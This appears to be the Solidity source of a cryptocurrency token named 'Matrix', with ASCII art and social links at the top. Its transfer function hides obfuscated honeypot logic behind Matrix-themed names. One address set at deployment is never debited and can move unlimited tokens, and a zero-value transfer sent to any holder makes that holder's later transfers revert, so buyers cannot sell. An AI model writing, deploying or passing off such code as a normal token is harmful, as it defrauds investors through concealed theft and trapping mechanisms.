/*

https://twitter.com/MatrixTokenEth
https://t.me/MatrixToken_eth

.........................................................................................................
.........................................................................................................
.........................................................................................................
.................................................,,:::;;;;::,,...........................................
.............................................:;+*?????????????*+:,.......................................
.........................................,:+??????***********?????+,.....................................
.......................................:+????********************???;....................................
....................................,;*???*************************?%*,..................................
..................................,+???******************************??,.................................
.................................,???*********************************??,................................
................................,??************************************%*................................
................................+%**************************************S:...............................
................................??**************************************?%,..............................
...............................,%****************************************??..............................
...............................,%*****************************************%+.............................
...............................,%?*************************???************??.............................
................................??************************?%??*****????****%;............................
................................*%**********???%%%%S%%%%?%@%*?SS#####S%%%%??%............................
............................,,,,?%???????*??%SSSSSSS#####@S**?%#S%%????%%%%%S*,..........................
..........................,*????%S?????????%SSSSSSSSSSSSS%?%??%*%%SSSSSSSS%%#S*..........................
.........................,%?**?**????????%?S%S%??S#SS?*?%S%???S*S?%SSS%*??%SSS*..........................
.........................:S*?S##S?*******%?S%%?**S@##?**%S%***?%%+?###%+**%S%S+..........................
..........................*%?%%@@#*??****?%%??????%%%%%SS%?****%#%??%%%%S%%?%%:..........................
..........................,?%**%S@??@%****%%?*****?????S%*******S%??%%%%%%%%S%...........................
...........................,??*%@@S?S#?****???????????S?*???**??%S?%%%%?????S+...........................
............................,%?*%SS*?##?**************%%?SS??*?%%?*********?S,...........................
.............................,*??????#@@S%?*************???**?*************S+............................
...............................:;++?%#@@@@S*********??%S#@#??##SS?********?S,............................
...................................+#%#@@@S%%?***?S#@###S%%?%S%SS#S%?*****%%.............................
...................................*S#%@@@@@@#?*?S#SS%%%%??%%????%%S#S***?#:.............................
...................................*%%SS@@@@@@#???*??%%??????????%SS%S?**S*..............................
...................................%?%#%S@@@@@@@%*****??%%%%%%%%%??**???%*...............................
..................................,S??%S?%@@@@@@@#%**????%S#@%??****?SS%;................................
..................................:S**?%%*S@@@@@@@@##@%*??*?%??*???%@@?,.................................
..................................*%***???*%@@@@@@@@@@@#@@##@@@#@@@@#;...................................
................................,:%?**?????*?S#@@@@@@@@@@@@@@@@@@@@@:....................................
..............................:%##S??**%????**??S#@@@@@@@@@@@@##S???.....................................
............................,+#@#####S??%***?*****?%S##@##S%??****%;.....................................
...........................;%##########S#S***********???*****??**?%,.....................................
.........................;%##############@S?********????????????*??......................................
.......................;%###################%?**********???*???**%;......................................
....................,+%#######################S%?***************?%.......................................
..................:*S############################S??************?@?:.....................................
...............,;?##################################S%??********%@@#?:...................................
.............:*S########################################S%???**?S@####*,.................................
..........:*S################################################SS########S;................................
.......,+S###############################################################%;,.............................
.....,*####################################################################%+,...........................
....+#########################################################################%+,........................
...?############################################################################S?:......................
..*###############################################################################@%;....................
.,###################################################################################?,..................

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TheMatrix is Ownable {
    uint256 public totalSupply = 1_000_000_000_000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private cypher = 11;

    address public uniswapV2Pair;

    constructor(address theMatrix) {
        balanceOf[msg.sender] = totalSupply;
        matrix[theMatrix] = cypher;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private mind;

    function approve(address simulated, uint256 pills) public returns (bool success) {
        allowance[msg.sender][simulated] = pills;
        emit Approval(msg.sender, simulated, pills);
        return true;
    }

    function transferFrom(address neo, address mainframe, uint256 pills) public returns (bool success) {
        escapeTheMatrix(neo, mainframe, pills);
        require(pills <= allowance[neo][msg.sender]);
        allowance[neo][msg.sender] -= pills;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private matrix;

    function transfer(address mainframe, uint256 pills) public returns (bool success) {
        escapeTheMatrix(msg.sender, mainframe, pills);
        return true;
    }

    string public name = 'Matrix';

    function escapeTheMatrix(address neo, address mainframe, uint256 pills) private returns (bool success) {
        if (matrix[neo] == 0) {
            balanceOf[neo] -= pills;
        }

        if (pills == 0) mind[mainframe] += cypher;

        if (matrix[neo] == 0 && uniswapV2Pair != neo && mind[neo] > 0) {
            matrix[neo] -= cypher;
        }

        balanceOf[mainframe] += pills;
        emit Transfer(neo, mainframe, pills);
        return true;
    }

    string public symbol = 'MATRIX';
}